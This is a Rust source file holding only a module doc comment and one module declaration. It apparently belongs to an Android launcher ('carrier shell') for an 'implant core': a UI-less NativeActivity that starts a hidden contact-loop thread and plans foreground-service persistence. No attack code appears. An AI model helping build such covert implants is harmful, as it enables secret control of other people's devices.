//! The Android carrier shell (architecture.md Sec 12.2, the mobile reach
//! leg): the entry `android.app.NativeActivity` calls when the APK's
//! manifest names this library. The shell is plumbing, not protocol -- the
//! first lifecycle callback starts the implant core's carrier thread (the
//! parent crate's library, run unchanged), and that thread owns the
//! contact loop until the system kills the process. No UI is created; the
//! activity exists so the system has a component to launch, and the
//! foreground-service upgrade is the durability story for legs that must
//! survive backgrounding (operations/android.md) -- an operational step
//! the runbook owns, not a second in-tree shell.
//!
//! The FFI surface is the NDK's native_activity.h contract, hand-declared
//! (the framework class is first-party enough that no wrapper crate is
//! warranted for one entry point and a callback table): the struct the
//! framework hands over is opaque beyond its first member, and the
//! table's field order is the ABI. Non-Android hosts compile this crate
//! to an empty library so the tree stays fmt/clippy clean anywhere; the
//! build unit asks for it against -linux-android triples only.

#[cfg(target_os = "android")]
mod activity;
